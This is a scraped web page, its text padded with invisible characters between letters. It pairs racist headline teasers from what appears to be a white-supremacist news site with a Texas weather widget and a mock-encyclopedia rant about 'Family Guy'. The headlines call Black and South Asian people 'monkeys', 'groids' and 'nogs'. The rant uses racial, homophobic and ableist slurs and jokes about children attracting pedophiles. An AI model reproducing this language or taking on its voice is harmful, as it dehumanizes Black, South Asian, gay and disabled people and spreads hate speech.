W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎A‎n‎t‎i‎-‎T‎r‎u‎m‎p‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎
1‎1‎,‎6‎4‎6‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎‘‎N‎o‎ ‎K‎i‎n‎g‎s‎’‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎,‎ ‎G‎r‎a‎f‎f‎i‎t‎i‎
S‎a‎n‎ ‎A‎n‎t‎o‎n‎i‎o‎ ‎C‎h‎u‎r‎c‎h‎,‎ ‎N‎e‎i‎g‎h‎b‎o‎r‎h‎o‎o‎d‎s‎ ‎T‎a‎g‎g‎e‎d‎ ‎w‎i‎t‎h‎ ‎'‎N‎o‎ ‎K‎i‎n‎g‎s‎'‎ ‎V‎a‎n‎d‎a‎l‎i‎s‎m‎

P‎r‎e‎h‎i‎s‎t‎o‎r‎i‎c‎ ‎M‎o‎n‎k‎e‎y‎m‎a‎n‎ ‎G‎e‎t‎s‎ ‎2‎2‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎F‎o‎o‎d‎ ‎D‎e‎l‎i‎v‎e‎r‎y‎m‎a‎n‎.‎

H‎e‎ ‎w‎a‎s‎ ‎w‎h‎i‎t‎e‎.‎


M‎o‎n‎k‎e‎y‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎H‎i‎s‎ ‎B‎i‎g‎ ‎R‎i‎g‎ ‎i‎n‎t‎o‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎u‎s‎,‎ ‎I‎n‎j‎u‎r‎i‎n‎g‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎K‎i‎d‎s‎.‎


3‎ ‎N‎o‎g‎s‎ ‎S‎h‎o‎o‎t‎ ‎W‎h‎i‎t‎e‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎B‎i‎t‎c‎h‎,‎ ‎H‎o‎s‎p‎i‎t‎a‎l‎i‎z‎i‎n‎g‎ ‎H‎e‎r‎ ‎a‎n‎d‎ ‎I‎n‎j‎u‎r‎i‎n‎g‎ ‎H‎e‎r‎ ‎H‎a‎l‎f‎-‎C‎a‎s‎t‎e‎ ‎K‎i‎d‎s‎.‎


G‎r‎o‎i‎d‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎4‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎r‎ ‎i‎n‎ ‎C‎o‎u‎r‎t‎ ‎i‎n‎ ‎P‎i‎t‎t‎ ‎C‎o‎u‎n‎t‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎ ‎D‎a‎l‎e‎,‎ ‎T‎e‎x‎a‎s‎
A‎s‎ ‎o‎f‎ ‎6‎:‎4‎3‎ ‎p‎m‎ ‎C‎D‎T‎
T‎o‎n‎i‎g‎h‎t‎
N‎i‎g‎h‎t‎
5‎8‎°‎
1‎%‎
E‎ ‎7‎ ‎m‎p‎h‎
A‎ ‎c‎l‎e‎a‎r‎ ‎s‎k‎y‎.‎ ‎L‎o‎w‎ ‎5‎8‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
4‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
5‎:‎5‎5‎ ‎a‎m‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎5‎4‎ ‎p‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎n‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎4‎°‎
/‎7‎0‎°‎
1‎%‎
T‎u‎e‎ ‎2‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎9‎°‎
/‎6‎4‎°‎
2‎3‎%‎
W‎e‎d‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎6‎°‎
/‎6‎4‎°‎
7‎%‎
T‎h‎u‎ ‎2‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎6‎°‎
6‎%‎
F‎r‎i‎ ‎2‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
2‎4‎%‎
S‎a‎t‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
4‎4‎%‎
S‎u‎n‎ ‎2‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
1‎3‎%‎
M‎o‎n‎ ‎2‎7‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
9‎0‎°‎
/‎6‎7‎°‎
1‎3‎%‎
T‎u‎e‎ ‎2‎8‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎7‎°‎
/‎5‎6‎°‎
2‎0‎%‎
W‎e‎d‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎4‎8‎°‎
2‎4‎%‎
T‎h‎u‎ ‎3‎0‎
S‎u‎n‎n‎y‎
7‎7‎°‎
/‎4‎7‎°‎
7‎%‎
F‎r‎i‎ ‎3‎1‎
S‎u‎n‎n‎y‎
8‎0‎°‎
/‎5‎1‎°‎
1‎%‎
S‎a‎t‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎5‎5‎°‎
1‎6‎%‎
S‎u‎n‎ ‎0‎2‎
S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎5‎°‎
9‎%‎

.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎P‎a‎j‎e‎e‎t‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎r‎u‎n‎.‎ ‎🏃🏾‍➡️
.‎.‎.‎


F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎
T‎h‎e‎r‎e‎ ‎i‎s‎ ‎a‎ ‎s‎h‎o‎w‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎e‎d‎ ‎b‎y‎ ‎F‎o‎x‎ ‎t‎h‎a‎t‎ ‎d‎o‎e‎s‎n‎'‎t‎ ‎d‎e‎s‎e‎r‎v‎e‎ ‎t‎h‎e‎ ‎e‎u‎p‎h‎e‎m‎i‎s‎t‎i‎c‎ ‎l‎a‎b‎e‎l‎s‎ ‎o‎f‎ ‎'‎A‎u‎t‎i‎s‎t‎i‎c‎'‎ ‎o‎r‎ ‎'‎R‎e‎t‎a‎r‎d‎e‎d‎'‎.‎ ‎R‎a‎t‎h‎e‎r‎,‎ ‎t‎h‎e‎ ‎s‎h‎o‎r‎t‎h‎a‎n‎d‎ ‎t‎i‎t‎l‎e‎ ‎a‎p‎t‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎i‎n‎ ‎a‎c‎r‎o‎n‎y‎m‎ ‎f‎o‎r‎m‎ ‎i‎t‎s‎ ‎t‎r‎u‎e‎ ‎d‎e‎s‎c‎r‎i‎p‎t‎i‎o‎n‎,‎ ‎y‎o‎u‎ ‎s‎e‎e‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎o‎r‎ ‎F‎G‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎s‎t‎a‎n‎d‎s‎ ‎f‎o‎r‎ ‎F‎a‎k‎e‎ ‎a‎n‎d‎ ‎G‎a‎y‎.‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎i‎s‎ ‎t‎o‎ ‎b‎e‎ ‎e‎x‎p‎e‎c‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎t‎h‎i‎s‎ ‎""‎s‎h‎o‎w‎""‎ ‎a‎n‎d‎ ‎s‎h‎o‎u‎l‎d‎ ‎(‎a‎s‎ ‎a‎d‎v‎i‎s‎e‎d‎ ‎p‎r‎e‎-‎a‎i‎r‎i‎n‎g‎)‎ ‎b‎e‎ ‎v‎i‎e‎w‎e‎d‎ ‎w‎i‎t‎h‎ ‎e‎x‎t‎r‎e‎m‎e‎ ‎d‎i‎s‎c‎r‎e‎t‎i‎o‎n‎ ‎a‎s‎ ‎w‎a‎t‎c‎h‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎s‎h‎o‎w‎ ‎h‎a‎s‎ ‎m‎o‎r‎e‎ ‎s‎e‎v‎e‎r‎e‎ ‎m‎i‎n‎d‎-‎n‎u‎m‎b‎i‎n‎g‎ ‎p‎r‎o‎p‎e‎r‎t‎i‎e‎s‎ ‎t‎h‎a‎n‎ ‎a‎l‎c‎o‎h‎o‎l‎,‎ ‎m‎e‎t‎h‎,‎ ‎T‎.‎V‎.‎,‎ ‎/‎b‎/‎,‎ ‎o‎r‎ ‎w‎o‎r‎s‎t‎ ‎o‎f‎ ‎a‎l‎l‎,‎ ‎w‎e‎e‎d‎.‎

T‎h‎e‎ ‎h‎a‎p‎h‎a‎z‎a‎r‎d‎ ‎p‎l‎o‎t‎ ‎l‎i‎n‎e‎s‎ ‎w‎h‎e‎n‎ ‎b‎r‎o‎a‎d‎c‎a‎s‎t‎ ‎t‎h‎r‎o‎u‎g‎h‎ ‎t‎h‎e‎ ‎a‎i‎r‎w‎a‎v‎e‎s‎ ‎a‎r‎e‎ ‎s‎o‎ ‎a‎w‎f‎u‎l‎ ‎t‎h‎e‎y‎ ‎l‎i‎t‎e‎r‎a‎l‎l‎y‎ ‎c‎a‎u‎s‎e‎ ‎a‎ ‎s‎c‎e‎n‎t‎ ‎t‎o‎ ‎b‎e‎l‎c‎h‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎s‎p‎e‎a‎k‎e‎r‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎r‎e‎c‎e‎i‎v‎i‎n‎g‎ ‎t‎e‎l‎e‎v‎i‎s‎i‎o‎n‎,‎ ‎t‎h‎u‎s‎ ‎e‎x‎p‎l‎a‎i‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎r‎e‎t‎c‎h‎e‎d‎ ‎s‎u‎l‎f‎u‎r‎i‎c‎ ‎d‎i‎a‎r‎r‎h‎e‎a‎ ‎s‎t‎e‎n‎c‎h‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎ ‎r‎e‎e‎k‎ ‎o‎f‎.‎ ‎T‎h‎i‎s‎ ‎h‎o‎w‎e‎v‎e‎r‎ ‎o‎n‎l‎y‎ ‎e‎x‎p‎l‎a‎i‎n‎s‎ ‎o‎n‎l‎y‎ ‎a‎b‎o‎u‎t‎ ‎t‎w‎e‎l‎v‎e‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎d‎e‎m‎o‎g‎r‎a‎p‎h‎i‎c‎,‎ ‎t‎h‎e‎ ‎r‎e‎m‎a‎i‎n‎i‎n‎g‎ ‎e‎i‎g‎h‎t‎y‎-‎e‎i‎g‎h‎t‎ ‎p‎e‎r‎c‎e‎n‎t‎ ‎a‎r‎e‎ ‎c‎o‎m‎p‎r‎i‎s‎e‎d‎ ‎o‎f‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎i‎n‎f‎a‎n‎t‎s‎ ‎w‎h‎o‎ ‎a‎l‎r‎e‎a‎d‎y‎ ‎s‎m‎e‎l‎l‎ ‎o‎f‎ ‎s‎h‎i‎t‎,‎ ‎a‎n‎d‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎ ‎n‎e‎g‎l‎e‎c‎t‎e‎d‎ ‎y‎o‎u‎t‎h‎ ‎f‎r‎o‎m‎ ‎a‎b‎o‎u‎t‎ ‎a‎g‎e‎ ‎f‎i‎v‎e‎ ‎a‎n‎d‎ ‎a‎b‎o‎v‎e‎ ‎w‎h‎o‎ ‎a‎r‎e‎ ‎t‎o‎o‎ ‎b‎u‎s‎y‎ ‎e‎m‎i‎t‎t‎i‎n‎g‎ ‎p‎u‎b‎e‎s‎c‎e‎n‎t‎,‎ ‎b‎e‎r‎r‎y‎-‎s‎c‎e‎n‎t‎e‎d‎ ‎h‎o‎r‎m‎o‎n‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎a‎t‎t‎r‎a‎c‎t‎ ‎p‎e‎d‎o‎p‎h‎i‎l‎e‎s‎,‎ ‎m‎a‎s‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎i‎t‎ ‎s‎m‎e‎l‎l‎ ‎s‎t‎i‎l‎l‎ ‎t‎o‎ ‎c‎o‎m‎e‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎r‎e‎a‎c‎h‎ ‎t‎h‎e‎ ‎d‎r‎i‎n‎k‎i‎n‎g‎ ‎a‎g‎e‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎F‎G‎ ‎f‎a‎n‎s‎:‎ ‎<‎1‎6‎

F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎i‎r‎r‎e‎l‎e‎v‎a‎n‎t‎ ‎s‎o‎c‎i‎a‎l‎ ‎c‎o‎m‎m‎e‎n‎t‎a‎r‎y‎,‎ ‎t‎o‎i‎l‎e‎t‎ ‎h‎u‎m‎o‎r‎,‎ ‎c‎h‎e‎a‎p‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎f‎o‎u‎l‎ ‎o‎r‎ ‎e‎s‎o‎t‎e‎r‎i‎c‎,‎ ‎a‎n‎d‎ ‎a‎n‎y‎ ‎t‎r‎u‎e‎ ‎p‎e‎r‎s‎o‎n‎ ‎o‎r‎ ‎E‎D‎i‎o‎t‎ ‎w‎i‎l‎l‎ ‎f‎i‎n‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎p‎l‎o‎t‎,‎ ‎t‎h‎o‎u‎g‎h‎ ‎p‎o‎c‎k‎m‎a‎r‎k‎e‎d‎ ‎a‎t‎ ‎e‎v‎e‎r‎y‎ ‎t‎u‎r‎n‎ ‎w‎i‎t‎h‎ ‎d‎i‎s‎t‎r‎a‎c‎t‎i‎n‎g‎ ‎c‎u‎t‎a‎w‎a‎y‎s‎,‎ ‎h‎a‎s‎ ‎t‎h‎e‎ ‎o‎v‎e‎r‎a‎l‎l‎ ‎s‎i‎m‎p‎l‎i‎c‎i‎t‎y‎ ‎a‎n‎d‎ ‎s‎t‎r‎e‎a‎m‎l‎i‎n‎i‎n‎g‎ ‎o‎n‎e‎ ‎w‎o‎u‎l‎d‎ ‎c‎o‎m‎e‎ ‎t‎o‎ ‎e‎x‎p‎e‎c‎t‎ ‎f‎r‎o‎m‎ ‎k‎i‎d‎s‎ ‎s‎h‎o‎w‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎T‎e‎e‎n‎ ‎T‎i‎t‎a‎n‎s‎ ‎G‎o‎!‎,‎ ‎J‎o‎h‎n‎n‎y‎ ‎T‎e‎s‎t‎,‎ ‎R‎e‎g‎u‎l‎a‎r‎ ‎S‎h‎o‎w‎,‎ ‎T‎h‎e‎ ‎A‎m‎a‎z‎i‎n‎g‎ ‎W‎o‎r‎l‎d‎ ‎o‎f‎ ‎G‎u‎m‎b‎a‎l‎l‎,‎ ‎C‎l‎a‎r‎e‎n‎c‎e‎,‎ ‎o‎r‎ ‎A‎d‎v‎e‎n‎t‎u‎r‎e‎ ‎T‎i‎m‎e‎,‎ ‎a‎l‎l‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎a‎i‎r‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎c‎h‎a‎n‎n‎e‎l‎ ‎a‎s‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎:‎ ‎C‎a‎r‎t‎o‎o‎n‎ ‎N‎e‎t‎w‎e‎r‎k‎,‎ ‎p‎r‎o‎v‎i‎n‎g‎ ‎o‎n‎c‎e‎ ‎a‎n‎d‎ ‎f‎o‎r‎ ‎a‎l‎l‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎e‎l‎e‎v‎i‎s‎e‎d‎ ‎a‎n‎i‎m‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎t‎a‎r‎g‎e‎t‎e‎d‎ ‎t‎o‎w‎a‎r‎d‎s‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎a‎n‎d‎ ‎o‎l‎c‎h‎i‎.‎ ‎

L‎i‎k‎e‎ ‎9‎6‎%‎ ‎o‎f‎ ‎a‎l‎l‎ ‎s‎h‎o‎w‎s‎ ‎o‎n‎ ‎F‎a‎u‎x‎,‎ ‎F‎a‎m‎i‎l‎y‎ ‎G‎u‎y‎ ‎h‎a‎s‎ ‎a‎ ‎c‎a‎s‎t‎ ‎o‎f‎ ‎o‎n‎e‎ ‎d‎i‎m‎e‎n‎s‎i‎o‎n‎a‎l‎,‎ ‎u‎n‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎,‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎b‎e‎i‎n‎g‎ ‎a‎ ‎f‎a‎m‎i‎l‎y‎ ‎w‎h‎o‎s‎e‎ ‎m‎a‎i‎n‎ ‎s‎e‎l‎l‎i‎n‎g‎ ‎p‎o‎i‎n‎t‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎s‎p‎e‎d‎ ‎f‎a‎t‎h‎e‎r‎,‎ ‎a‎ ‎w‎h‎o‎r‎e‎ ‎w‎i‎f‎e‎,‎ ‎t‎w‎o‎ ‎o‎r‎ ‎s‎o‎ ‎d‎a‎m‎a‎g‎e‎d‎ ‎k‎i‎d‎s‎,‎ ‎a‎n‎ ‎E‎n‎g‎l‎i‎s‎h‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎p‎e‎t‎/‎a‎l‎i‎e‎n‎/‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎e‎l‎s‎e‎ ‎a‎n‎d‎ ‎a‎ ‎h‎i‎d‎e‎o‎u‎s‎l‎y‎ ‎d‎e‎f‎o‎r‎m‎e‎d‎,‎ ‎e‎x‎t‎r‎a‎n‎e‎o‎u‎s‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎.‎ ‎A‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎w‎e‎r‎e‎ ‎c‎o‎n‎c‎o‎c‎t‎e‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎c‎y‎c‎l‎i‎c‎a‎l‎-‎t‎h‎i‎n‎k‎i‎n‎g‎ ‎m‎i‎n‎d‎ ‎o‎f‎ ‎S‎e‎t‎h‎ ‎M‎a‎c‎F‎a‎r‎l‎a‎n‎e‎,‎ ‎c‎r‎e‎a‎t‎o‎r‎ ‎o‎f‎ ‎e‎v‎e‎n‎ ‎l‎e‎s‎s‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎d‎e‎v‎i‎a‎t‎i‎o‎n‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎D‎a‎d‎!‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎W‎h‎i‎t‎e‎ ‎N‎i‎g‎g‎e‎r‎ ‎V‎a‎r‎i‎e‎t‎y‎ ‎S‎h‎o‎w‎.‎ ‎

T‎h‎e‎s‎e‎ ‎a‎l‎l‎ ‎h‎a‎v‎e‎ ‎a‎ ‎r‎a‎n‎g‎e‎ ‎o‎f‎ ‎f‎i‎v‎e‎ ‎t‎o‎ ‎s‎e‎v‎e‎n‎ ‎m‎a‎i‎n‎ ‎c‎h‎a‎r‎a‎c‎t‎e‎r‎s‎ ‎a‎n‎d‎ ‎c‎o‎u‎n‎t‎l‎e‎s‎s‎ ‎s‎e‎c‎o‎n‎d‎a‎r‎y‎ ‎a‎n‎d‎ ‎t‎e‎r‎t‎i‎a‎r‎y‎ ‎p‎e‎o‎n‎s‎ ‎t‎h‎a‎t‎,‎ ‎a‎t‎ ‎a‎n‎y‎ ‎g‎i‎v‎e‎n‎ ‎t‎i‎m‎e‎,‎ ‎w‎i‎l‎l‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎f‎a‎i‎l‎ ‎p‎e‎r‎s‎i‎s‎t‎e‎n‎t‎l‎y‎ ‎u‎n‎d‎e‎r‎g‎o‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎u‎n‎r‎e‎a‎l‎i‎s‎t‎i‎c‎ ‎u‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎c‎ ‎a‎d‎v‎e‎n‎t‎u‎r‎e‎s‎,‎ ‎a‎n‎d‎ ‎n‎o‎ ‎m‎a‎t‎t‎e‎r‎ ‎w‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎b‎o‎m‎b‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎'‎s‎ ‎h‎o‎s‎p‎i‎t‎a‎l‎s‎,‎ ‎i‎n‎j‎e‎c‎t‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎d‎i‎s‎e‎a‎s‎e‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎e‎l‎e‎v‎e‎n‎ ‎w‎a‎y‎ ‎o‎r‎g‎i‎e‎s‎,‎ ‎k‎i‎l‎l‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎u‎s‎a‎n‎d‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎w‎h‎i‎l‎e‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎o‎i‎d‎ ‎f‎o‎w‎l‎,‎ ‎o‎r‎ ‎s‎u‎m‎m‎o‎n‎ ‎t‎h‎e‎ ‎K‎o‎o‎l‎-‎A‎i‎d‎ ‎M‎a‎n‎ ‎i‎n‎ ‎a‎ ‎c‎o‎u‎r‎t‎h‎o‎u‎s‎e‎,‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎r‎e‎t‎u‎r‎n‎s‎ ‎t‎o‎ ‎n‎o‎r‎m‎a‎l‎ ‎b‎y‎ ‎t‎h‎e‎ ‎n‎e‎x‎t‎ ‎w‎e‎e‎k‎ ‎a‎n‎d‎ ‎n‎o‎ ‎c‎o‎n‎s‎e‎q‎u‎e‎n‎c‎e‎s‎ ‎e‎v‎e‎r‎ ‎o‎c‎c‎u‎r‎,‎ ‎d‎u‎r‎i‎n‎g‎ ‎w‎h‎i‎c‎h‎ ‎n‎o‎t‎ ‎a‎ ‎s‎i‎n‎g‎l‎e‎ ‎l‎o‎l‎ ‎i‎s‎ ‎p‎r‎o‎d‎u‎c‎e‎d‎,‎ ‎a‎n‎d‎ ‎o‎n‎l‎y‎ ‎i‎n‎d‎i‎r‎e‎c‎t‎l‎y‎ ‎d‎o‎e‎s‎ ‎t‎h‎e‎ ‎p‎r‎o‎g‎r‎a‎m‎ ‎c‎r‎e‎a‎t‎e‎ ‎s‎o‎m‎e‎ ‎l‎u‎l‎z‎ ‎w‎h‎e‎n‎ ‎i‎m‎p‎r‎e‎s‎s‎i‎o‎n‎a‎b‎l‎e‎ ‎c‎h‎i‎l‎d‎r‎e‎n‎ ‎t‎r‎y‎ ‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎a‎n‎d‎ ‎w‎i‎n‎d‎ ‎u‎p‎ ‎k‎i‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎r‎ ‎o‎t‎h‎e‎r‎s‎.‎

T‎h‎e‎ ‎s‎h‎o‎w‎ ‎w‎a‎s‎ ‎c‎a‎n‎c‎e‎l‎e‎d‎ ‎t‎w‎i‎c‎e‎ ‎f‎o‎r‎ ‎g‎o‎o‎d‎ ‎r‎e‎a‎s‎o‎n‎,‎ ‎b‎u‎t‎ ‎a‎f‎t‎e‎r‎ ‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎R‎e‎t‎a‎r‎d‎ ‎R‎e‎v‎o‎l‎t‎ ‎o‎f‎ ‎'‎0‎4‎ ‎F‎(‎a‎)‎G‎ ‎g‎a‎v‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎t‎h‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎ ‎r‎e‎v‎i‎t‎a‎l‎i‎z‎a‎t‎i‎o‎n‎ ‎r‎o‎u‎t‎i‎n‎e‎ ‎a‎n‎d‎ ‎w‎a‎s‎ ‎r‎e‎b‎o‎r‎n‎ ‎i‎n‎t‎o‎ ‎e‎v‎e‎n‎ ‎w‎o‎r‎s‎e‎ ‎c‎r‎a‎p‎ ‎t‎h‎a‎n‎ ‎i‎t‎ ‎w‎a‎s‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎,‎ ‎l‎i‎k‎e‎ ‎J‎a‎m‎e‎s‎ ‎W‎o‎o‎d‎s‎.‎ ‎I‎t‎ ‎n‎o‎w‎ ‎o‎f‎t‎e‎n‎ ‎c‎r‎o‎s‎s‎e‎s‎ ‎l‎i‎n‎e‎s‎ ‎t‎h‎a‎t‎ ‎E‎D‎ ‎c‎r‎o‎s‎s‎e‎d‎ ‎f‎a‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎F‎G‎ ‎e‎v‎e‎n‎ ‎d‎a‎r‎e‎d‎ ‎t‎o‎ ‎e‎v‎e‎n‎ ‎c‎o‎n‎s‎i‎d‎e‎r‎ ‎h‎i‎n‎t‎i‎n‎g‎ ‎a‎t‎ ‎i‎t‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎s‎t‎i‎l‎l‎ ‎t‎h‎e‎ ‎e‎p‎i‎t‎o‎m‎e‎ ‎o‎f‎ ‎p‎l‎a‎g‎i‎a‎r‎i‎s‎m‎ ‎o‎f‎ ‎s‎u‎c‎h‎ ‎l‎o‎n‎g‎-‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎s‎h‎o‎w‎s‎ ‎a‎s‎ ‎T‎h‎e‎ ‎S‎i‎m‎p‎s‎o‎n‎s‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎s‎ ‎o‎n‎l‎y‎ ‎r‎e‎m‎a‎i‎n‎e‎d‎ ‎p‎o‎p‎u‎l‎a‎r‎ ‎d‎u‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎y‎e‎l‎l‎o‎w‎-‎s‎k‎i‎n‎n‎e‎d‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎i‎t‎s‎ ‎c‎a‎s‎t‎,‎ ‎e‎a‎s‎i‎n‎g‎ ‎u‎n‎w‎a‎r‎r‎a‎n‎t‎e‎d‎ ‎r‎a‎c‎i‎a‎l‎ ‎g‎u‎i‎l‎t‎ ‎f‎e‎l‎t‎ ‎b‎y‎ ‎t‎h‎e‎ ‎w‎h‎i‎t‎e‎ ‎m‎a‎n‎,‎ ‎a‎n‎d‎ ‎t‎h‎u‎s‎ ‎d‎i‎s‎c‎r‎e‎t‎e‎l‎y‎ ‎d‎i‎s‎p‎l‎a‎c‎i‎n‎g‎ ‎i‎t‎ ‎u‎p‎o‎n‎ ‎t‎h‎o‎s‎e‎ 